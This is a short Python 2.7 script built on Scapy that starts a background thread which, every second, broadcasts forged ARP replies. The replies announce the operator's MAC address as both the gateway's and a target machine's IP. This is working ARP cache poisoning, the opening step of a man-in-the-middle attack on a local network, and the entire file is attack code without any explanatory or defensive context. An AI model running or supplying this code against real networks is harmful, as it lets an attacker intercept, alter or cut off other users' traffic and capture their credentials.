#!/usr/bin/env python2.7

from scapy.all import *
import threading
from time import sleep

def ArpPoisoner(args):
    def ArpPoison():
        s = conf.L2socket(iface=args.interface)
        while True:
            sleep(1)
            s.send(Ether(src=args.host_mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=args.host_mac, psrc=args.gateway_ip, op="is-at"))
            s.send(Ether(src=args.host_mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=args.host_mac, psrc=args.target_ip, op="is-at"))      
    t = threading.Thread(name='ArpPoisoner', target=ArpPoison)
    t.setDaemon(True)
    print ('\033[92m[+]\tStarting ARP poisoner\033[0m')
    t.start()